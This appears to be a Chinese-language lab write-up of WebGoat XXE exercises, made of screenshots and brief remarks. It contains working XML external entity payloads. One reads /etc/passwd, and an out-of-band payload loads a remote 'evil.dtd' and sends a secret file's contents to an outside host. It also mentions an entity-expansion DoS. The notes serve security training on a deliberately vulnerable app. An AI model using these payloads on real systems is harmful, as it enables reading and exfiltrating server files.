---
title: "XXE"
weight: 2
bookToc: false
---

![](/data/image/security/exploit/webgoat/A5/xxe/image.png)

服务器端存的时候就会被替换了
```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE author [
  <!ENTITY js SYSTEM "file:///etc/passwd">
]>
<comment><text>&js;</text></comment>
```

![](/data/image/security/exploit/webgoat/A5/xxe/image-1.png)

![](/data/image/security/exploit/webgoat/A5/xxe/image-2.png)

---

API没有限制只能是json，传xml也可以

![](/data/image/security/exploit/webgoat/A5/xxe/1.png)

![](/data/image/security/exploit/webgoat/A5/xxe/image-3.png)

![](/data/image/security/exploit/webgoat/A5/xxe/image-4.png)

---

DoS 构造了一个指数级增长的情况

![](/data/image/security/exploit/webgoat/A5/xxe/image-5.png)

---

XXE Out-of-band 外带数据 参看[https://www.invicti.com/learn/out-of-band-xml-external-entity-oob-xxe](https://www.invicti.com/learn/out-of-band-xml-external-entity-oob-xxe)

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data [
  <!ENTITY % file SYSTEM
  "file:///home/webgoat/.webgoat-2025.3/XXE/csrf-zqqqqq/secret.txt">

  <!ENTITY % dtd SYSTEM
  "http://xxx.226:12345/evil.dtd">

  %dtd;
]>

<comment><text>&send;</text></comment>
```

```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://xxx.226:12345/?collect=%file;'>">
%all;
```

![](/data/image/security/exploit/webgoat/A5/xxe/image-7.png)

![](/data/image/security/exploit/webgoat/A5/xxe/image-6.png)